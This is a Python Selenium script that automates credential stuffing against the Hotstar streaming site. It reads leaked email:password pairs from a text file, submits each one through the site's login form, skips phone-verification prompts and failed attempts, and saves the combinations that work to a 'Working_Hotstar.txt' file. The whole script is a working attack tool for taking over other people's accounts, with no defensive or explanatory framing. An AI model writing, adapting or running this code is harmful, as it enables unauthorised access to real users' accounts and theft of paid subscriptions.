
#Importing all the important libraries and exceptions to be used
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException
import time

#creating the driver and visiting the site
driver = webdriver.Chrome("C:\\chromedriver.exe")
driver.get("https://www.hotstar.com/in")

#opening file and reading its lines into a list
file = open("600+_hotstar.txt", "r")

data = file.readlines()

#this loop will pass every email and password in file
i = 108

while i <= 3709:
    email = str(data[i].split(":")[0]) #extracting email
    password = str(data[i].split(":")[1]) #extracting password
    driver.implicitly_wait(5) #waiting for loading of page

    #clicks the login button and inputs the email and clicks submit
    signin = driver.find_element_by_xpath('/html/body/div/div[2]/div/div[1]/div[1]/div/div[2]/div/div[5]/div')
    signin.click()
    driver.implicitly_wait(5)
    email_fb_btn = driver.find_element_by_xpath('/html/body/div/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/button')
    email_fb_btn.click()
    email_container = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/div[1]/input')
    email_container.send_keys(email)
    submit = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/button')
    submit.click()
    driver.implicitly_wait(2) #waiting to load
    
    try:
        
        try:
            #Checking if phone number verification occurs
            phone_number = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[2]/div/span[2]')
            close = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[2]')
            close.click() #closing the verification
            
        except NoSuchElementException:
            
            #if phone number verification does not occurs
            #then inputing the password
            password_container = driver.find_element_by_xpath("/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/div[2]/input")
            password_container.send_keys(password)
            driver.implicitly_wait(2) #waiting for page to load
            submit = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/button')
            submit.click()
            #if password is wrong then it clicks close
            error = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/p')
            close = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[2]')
            close.click()
            
    except StaleElementReferenceException:
        
            #if the login is successfull then it prints the success and saves the email and password in the new file
            print("SUCCESS")
            print(email, password)
            close = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[2]')
            close.click()
            working = open("Working_Hotstar.txt", "a")
            working.write("Username: " + email + "\nPassword:" + password + "\n\n")
            working.close()
            
       
    i += 6 #incrementing i as suitable with lines to skip in file.

